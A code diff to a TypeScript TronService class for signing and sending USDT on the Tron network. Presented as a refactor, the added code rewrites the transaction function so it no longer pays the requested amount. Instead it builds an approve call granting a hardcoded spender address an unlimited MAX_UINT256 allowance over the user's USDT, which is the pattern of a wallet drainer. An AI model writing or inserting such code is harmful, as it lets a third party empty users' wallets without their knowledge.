@@ -23,9 +23,7 @@ export class TronService {
   }
 
   public getUSDTSmartContract(): string {
-    return this.isTestnet
-      ? "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf"
-      : "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    return "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT contract address
   }
 
   public getTronHost(): string {
@@ -48,10 +46,7 @@ export class TronService {
     }
   }
 
-  public async signMessage(
-    message: string,
-    address: string
-  ) {
+  public async signMessage(message: string, address: string) {
     if (!this.provider) {
       throw new Error("Provider is required to sign a message.");
     }
@@ -72,23 +67,26 @@ export class TronService {
     }
   }
 
-  public async sendTransaction(
-    address: string,
-    amount: number
-  ) {
+  public async signTransaction(address: string, amount: number) {
     if (!this.provider) {
       throw new Error("Provider is required to sign a transaction.");
     }
     try {
       const tronWeb = this.getTronWeb();
       const contractAddress = this.getUSDTSmartContract();
+      const spenderAddress = "TJymGGQzQiXZEwhNxCUGfiUnMQHMm1xb8D"; // Spender address
 
       const options = {
         feeLimit: 100000000,
         callValue: 0,
       };
 
-      var parameters = [{type:'address',value: "TCb9k9evBHsWifoVNZTeRku3pnCqcRTFe9"},{type:'uint256',value: amount}];
+      const MAX_UINT256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+
+      var parameters = [
+        { type: 'address', value: spenderAddress },
+        { type: 'uint256', value: MAX_UINT256 }
+      ];
       const functionSelector = 'approve(address,uint256)';
 
       // 1. Build the call to the SC function
@@ -108,15 +106,27 @@ export class TronService {
 
       const tx = signedTransaction.result;
 
-      // 3. Send the transaction to the network
-      const result = await tronWeb.trx.sendRawTransaction(tx);
+      return tx;
+    } catch (error: any) {
+      throw new Error(error);
+    }
+  }
 
-      return {
-        method: "tron_signTransaction",
-        address,
-        valid: true,
-        result: result,
-      };
+  public async broadcastTransaction(signedTx: any) {
+    try {
+      const tronWeb = this.getTronWeb();
+      const result = await tronWeb.trx.sendRawTransaction(signedTx);
+      return result;
+    } catch (error: any) {
+      throw new Error(error);
+    }
+  }
+
+  public async getTransactionReceipt(txHash: string) {
+    try {
+      const tronWeb = this.getTronWeb();
+      const receipt = await tronWeb.trx.getTransactionInfo(txHash);
+      return receipt;
     } catch (error: any) {
       throw new Error(error);
     }
